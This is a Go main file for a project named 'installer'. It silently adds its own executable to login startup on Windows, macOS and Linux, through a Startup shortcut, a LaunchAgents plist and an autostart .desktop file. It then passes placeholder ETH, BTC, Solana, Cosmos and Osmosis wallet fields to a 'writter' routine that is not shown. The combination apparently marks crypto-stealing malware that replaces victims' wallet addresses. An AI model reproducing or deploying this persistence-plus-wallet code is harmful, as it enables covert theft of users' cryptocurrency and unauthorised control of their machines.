package main

import (
	"os"
	"path/filepath"
	"runtime"

	"github.com/DracoR22/installer/startup"
	"github.com/DracoR22/installer/writter"
)

// Global instance of WalletTypes
var MyWallets = writter.WalletTypes{
	ETH_WALLET:    "ETH_WALLET",
	BTC_WALLET:    "BTC_WALLET",
	SOLANA_WALLET: "SOLANA_WALLET",
	COSMOS_WALLET: "COSMOS_WALLET",
	OSMO_WALLET:   "OSMO_WALLET",
}

func main() {

	// Startup
	exePath, err := os.Executable()
	if err != nil {
		panic(err)
	}

	if runtime.GOOS == "windows" {
		shortcutPath := startup.GetStartupPath() + "\\" + filepath.Base(exePath) + ".lnk"
		startup.CreateShortcut(exePath, shortcutPath)
	} else if runtime.GOOS == "darwin" {
		plistPath := filepath.Join(startup.GetLaunchAgentsPath(), filepath.Base(exePath)+".plist")
		startup.CreatePlist(exePath, plistPath)
	} else if runtime.GOOS == "linux" {
		desktopFilePath := filepath.Join(startup.GetAutostartPath(), filepath.Base(exePath)+".desktop")
		startup.CreateDesktopFile(exePath, desktopFilePath)
	}

	// Run writter
	writter.Write(MyWallets)
}
